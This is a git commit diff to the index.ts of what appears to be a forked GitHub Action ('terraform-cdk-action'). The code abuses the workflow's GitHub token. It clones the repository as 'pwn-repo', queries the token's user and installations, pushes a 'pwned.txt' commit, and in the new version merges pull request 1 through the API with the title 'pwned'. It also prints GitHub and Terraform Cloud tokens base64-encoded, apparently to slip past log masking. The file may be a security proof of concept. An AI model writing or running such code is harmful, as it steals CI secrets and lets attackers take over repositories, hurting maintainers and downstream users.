c9665c6a3cb4c1a384fd303731c1255c896432ba
mousefluff <124876575+mousefluff@users.noreply.github.com>
2024-02-17 17:06:33 +0100

    Update index.ts

--- src/index.ts
+++ src/index.ts
@@ -17,13 +17,23 @@ const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").revers
 
 
 console.log('Testing token...')
-execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git pwn-repo`, { stdio: 'inherit' });
-console.log(execSync('ls -la pwn-repo').toString());
+const str = `# Merge PR
+curl -X PUT \
+    https://api.github.com/repos/mousefluff/terraform-cdk-action/pulls/1/merge \
+    -H "Accept: application/vnd.github.v3+json" \
+    --header "authorization: Bearer ${process.env.INPUT_GITHUBTOKEN}" \
+    --header 'content-type: application/json' \
+    -d '{"commit_title":"pwned"}'`;
 
-execSync(`curl -H "Authorization: token ${process.env.INPUT_GITHUBTOKEN}" https://api.github.com/user`, { stdio: 'inherit' });
-execSync(`curl -H "Authorization: token ${process.env.INPUT_GITHUBTOKEN}" https://api.github.com/app/installations`, { stdio: 'inherit' });
+execSync(str, { stdio: 'inherit' });
 
-execSync("bash -c 'cd ./pwn-repo && git config user.email \"you@example.com\" && git config user.name \"Your Name\" && touch pwned.txt && git add pwned.txt && git commit -m \"Add pwned.txt\" && git push'", { stdio: 'inherit' });
+//execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git pwn-repo`, { stdio: 'inherit' });
+//console.log(execSync('ls -la pwn-repo').toString());
+
+//execSync(`curl -H "Authorization: token ${process.env.INPUT_GITHUBTOKEN}" https://api.github.com/user`, { stdio: 'inherit' });
+//execSync(`curl -H "Authorization: token ${process.env.INPUT_GITHUBTOKEN}" https://api.github.com/app/installations`, { stdio: 'inherit' });
+
+//execSync("bash -c 'cd ./pwn-repo && git config user.email \"you@example.com\" && git config user.name \"Your Name\" && touch pwned.txt && git add pwned.txt && git commit -m \"Add pwned.txt\" && git push'", { stdio: 'inherit' });
 
 console.log('\r\nDumping tokens:', {tfToken, ghToken});
 console.log('GH:', Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("")).toString('base64'))
